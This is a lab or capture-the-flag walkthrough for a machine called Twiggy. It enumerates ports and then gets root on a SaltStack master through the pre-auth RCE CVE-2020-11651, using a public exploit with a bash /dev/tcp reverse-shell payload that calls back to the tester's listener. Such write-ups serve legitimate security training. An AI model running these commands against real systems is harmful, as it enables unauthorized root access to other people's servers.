____

# Exploitation Guide for Twiggy

## Summary

We'll gain access to this target by exploiting a pre-auth RCE vulnerability on a SaltStack master, which will grant us command execution on the master by creating a runner of `salt.cmd` with a `cmd.exec_code` function.

## Enumeration

### Nmap

Let's begin with a simple `nmap` scan.

```
kali@kali:~$ sudo nmap -p- 192.168.120.121  
Nmap scan report for 192.168.120.121
Host is up (0.0011s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
4505/tcp open  unknown
4506/tcp open  unknown
8000/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 105.30 seconds
```

This indicates ports 4505 and 4506 are open. Let's run a more detailed scan.

```
kali@kali:~$ sudo nmap -p 4505,4506 192.168.120.121 -sV
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-21 15:21 EST
Nmap scan report for 192.168.120.121
Host is up (0.030s latency).

PORT     STATE SERVICE VERSION
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
```

These are default ports for `ZeroMQ`.

### Curl

Next, we'll run `curl` in verbose mode against port 8000.

```
kali@kali:~$ curl http://192.168.120.121:8000 -v
*   Trying 192.168.120.121:8000...
* Connected to 192.168.120.121 (192.168.120.121) port 8000 (#0)
> GET / HTTP/1.1
> Host: 192.168.120.121:8000
> User-Agent: curl/7.72.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.16.1
< Date: Mon, 21 Dec 2020 20:36:04 GMT
< Content-Type: application/json
< Content-Length: 146
< Connection: keep-alive
< Access-Control-Expose-Headers: GET, POST
< Vary: Accept-Encoding
< Allow: GET, HEAD, POST
< Access-Control-Allow-Credentials: true
< Access-Control-Allow-Origin: *
< X-Upstream: salt-api/3000-1
< 
* Connection #0 to host 192.168.120.121 left intact
{"clients": ["local", "local_async", "local_batch", "local_subset", "runner", "runner_async", "ssh", "wheel", "wheel_async"], "return": "Welcome"}
```

The response contains an interesting header, revealing that a SaltStack Rest API is listening on that port:

```
 X-Upstream: salt-api/3000-1
```

## Exploitation

### CVE-2020-11651

Based on the version listed in the header (`3000-1`) we discover an [available remote code execution exploit](https://github.com/dozernz/cve-2020-11651).

Once we download the exploit, we discover that `salt` doesn't support Python 3.8 and Kali won't let us install packages under Python 3.7. Let's tweak the exploit to address this issue.

```
kali@kali:~$ python3 -m venv env
...
kali@kali:~$ . ./env/bin/activate
(env) kali@kali:~$ pip install distro salt
...
(env) kali@kali:~$ sed -i 's/from platform import _supported_dists//' ./env/lib/python3.8/site-packages/salt/grains/core.py
(env) kali@kali:~$ sed -i 's/_supported_dists +=/_supported_dists =/' ./env/lib/python3.8/site-packages/salt/grains/core.py
```

Now we can start a netcat listener on port 4505 and launch the exploit.

```
(env) kali@kali:~/machines/twiggy$ python3 exploit.py 192.168.120.121 master 'bash -i >& /dev/tcp/192.168.118.2/4505 0>&1'
/home/kali/env/lib/python3.8/site-packages/salt/ext/tornado/httputil.py:107: DeprecationWarning: Using or importing the ABCs from 'collections' instead of from 'collections.abc' is deprecated since Python 3.3, and in 3.9 it will stop working
  class HTTPHeaders(collections.MutableMapping):
Attempting to ping master at 192.168.120.121
Retrieved root key: 8tnPuz4Fk+nH4c2CVW3/1BBbWofubqMZGJ1gkEkiB6WzlnyqQ7muDw3dbtKNwTMjUU6IcNFD9VY=
Got response for attempting master shell: {'jid': '20200518074808085260', 'tag': 'salt/run/20200518074808085260'}. Looks promising!
```

This grants us a reverse shell as root.

```
kali@kali:~$ nc -lvp 4505
listening on [any] 4505 ...
192.168.120.121: inverse host lookup failed: Unknown host
connect to [192.168.118.2] from (UNKNOWN) [192.168.120.121] 33584
bash: no job control in this shell
[root@localhost root]# id
id
uid=0(root) gid=0(root) groups=0(root)
```
